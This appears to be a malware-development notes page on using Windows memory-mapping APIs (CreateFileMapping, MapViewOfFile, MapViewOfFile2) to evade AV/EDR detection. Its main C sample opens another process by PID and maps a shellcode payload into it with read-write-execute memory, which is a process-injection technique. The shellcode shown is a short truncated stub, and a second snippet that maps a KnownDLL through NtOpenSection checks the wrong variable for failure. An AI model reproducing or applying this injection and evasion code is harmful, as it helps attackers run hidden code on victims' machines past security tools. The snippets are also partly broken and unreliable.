---
description: >-
  Using private memory allocation functions are heavily monitored by AV/EDR.
  Using mapped memory can help circumvent detection.
---

# Memory Mapping



## Introduction

Memory Mapping functions are a great way of efficiently reading / writing data to files, loading KnownDLL's, and more

***

## CreateFileMapping

[CreateFileMapping](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga) allows a process to create a virtual memory space that maps to the contents of a file on disk or to another memory location. The function returns a handle to the file mapping object.

```c
HANDLE CreateFileMappingA(
  [in]           HANDLE                hFile,
  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,     // Not Required - NULL
  [in]           DWORD                 flProtect,
  [in]           DWORD                 dwMaximumSizeHigh,           // Not Required - NULL
  [in]           DWORD                 dwMaximumSizeLow,
  [in, optional] LPCSTR                lpName                       // Not Required - NULL   
);
```

`hFile` - A handle to a file from which to create a file mapping handle.

`flProtect` - Specifies the page protection of the file mapping object. (`PAGE_EXECUTE_READWRITE)`

`dwMaximumSizeLow` - The size of the file mapping handle returned. (Size of payload)

## M**apViewOfFile**

[MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile) maps a view of a file mapping object into the address space of a process.&#x20;

```c
LPVOID MapViewOfFile(
  [in] HANDLE     hFileMappingObject,
  [in] DWORD      dwDesiredAccess,
  [in] DWORD      dwFileOffsetHigh,           // Not Required - NULL
  [in] DWORD      dwFileOffsetLow,            // Not Required - NULL
  [in] SIZE_T     dwNumberOfBytesToMap
);
```

* `hFileMappingObject` - The returned handle from the `CreateFileMapping` WinAPI, which is the file mapping object.
* `dwDesiredAccess` - The type of access to a file mapping object, which determines the page protection of the page created. Should correspond w/ the flProtect attributes in CreateFileMapping.
* `dwNumberOfBytesToMap` - The size of the payload.



The below code creates a local and remote memory mapping that contains the Payload w/ RWX permissions.

```c
#include <stdio.h>
#include <wchar.h>
#include <windows.h>
#include <memoryapi.h>


#pragma comment(lib, "onecore.lib")

// x64 calc shellcode 
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51
};


int wmain( int argc, wchar_t* argv[]) {

    HANDLE hProcess = NULL;
    HANDLE hLocalFile = NULL;
    PVOID pLocalMapAddress = NULL;
    PVOID pRemoteMapAddress = NULL;
    DWORD PID = 0;

    if (argc < 2) {
        wprintf(L"[!] Insufficient Arguments Passed To Main Function\n");
        return -1;
    }

    PID = _wtoi(argv[1]);


    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        wprintf(L"[!] Failed to Open Process %d\n", GetLastError());
        return -1;
    }

    // Create Local Mapped Memory for payload 
    hLocalFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sizeof(Payload), NULL);
    if (hLocalFile == NULL) {
        wprintf(L"[!] CreateFileMappingW Failed %d\n", GetLastError());
        return -1;
    }

    
    pLocalMapAddress = MapViewOfFile(hLocalFile, FILE_MAP_WRITE, NULL, NULL, sizeof(Payload));
    if (pLocalMapAddress == NULL) {
        wprintf(L"[!] MapViewOfFile Failed %d\n", GetLastError());
        return -1;
    }

    // Copy Payload to to Local Mapped Memory
    memcpy(pLocalMapAddress, Payload, sizeof(Payload));


    // Copy & Create Remote Memory Mapping
    pRemoteMapAddress = MapViewOfFile2(hLocalFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pRemoteMapAddress == NULL) {
        wprintf(L"[!] MapViewOfFile Failed %d\n", GetLastError());
        return -1;
    }   

    wprintf(L"[+] Copied payload to remote memory address: %p\n", pRemoteMapAddress);
    getchar();

    return 0;
}

```

_**To Map Memory in Remote Process We can use the following:**_

##

##

## MapViewOfFile - Load KnownDLL

We use MapViewOfFile in conjuction with pNtOpenSection to read the DLL into memory.

```c

OBJECT_ATTRIBUTES objAtr        = { 0 };
UNICODE_STRING    unicodeString = { 0 };
PVOID pBuffer = 0;
HANDLE hSection;


unicodeString.Buffer = (PWSTR)NTDLL;
unicodeString.Length = wcslen(NTDLL) * sizeof(WCHAR);
unicodeString.MaximumLength = unicodeString.Length + sizeof(WCHAR);

InitializeObjectAttributes(&objAtr, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtOpenSection");

NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAtr);
if (status != 0x00) {
    printf("[!] NtOpenSection Failed With Error : 0x%0.8X \n", status);
    return -1;
}

pBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
if (MapViewOfFile == NULL) {
    wprintf(L"[!] MapViewOfFile Failed %d\n", GetLastError());
    return -1;
}
```

##

## MapViewOfFile2

[MapViewOfFile2](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2) is used to map memory in a remote process.

```c
PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,
  [in]           HANDLE  ProcessHandle,
  [in]           ULONG64 Offset,
  [in, optional] PVOID   BaseAddress,
  [in]           SIZE_T  ViewSize,
  [in]           ULONG   AllocationType,
  [in]           ULONG   PageProtection
);
```

## MapViewOfFile3

[MapViewOfFile3](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile3) is used to map memory in a remote process.

```c
PVOID MapViewOfFile3(
  [in]                HANDLE                 FileMapping,
  [in]                HANDLE                 Process,
  [in, optional]      PVOID                  BaseAddress,
  [in]                ULONG64                Offset,
  [in]                SIZE_T                 ViewSize,
  [in]                ULONG                  AllocationType,
  [in]                ULONG                  PageProtection,
  [in, out, optional] MEM_EXTENDED_PARAMETER *ExtendedParameters,
  [in]                ULONG                  ParameterCount
);
```

## UnmapViewOfFile

[UnmapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile) is used to unmap previously mapped memory. This should be called on cleanup.

## UnmapViewOfFileEx

This is an extended version of [UnmapViewOfFile](https://learn.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-unmapviewoffile) that takes an additional flags parameter.

## UnmapViewOfFile2

[UnmapViewOfFile2](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2) Unmaps a previously mapped view of a file or a pagefile-backed section.
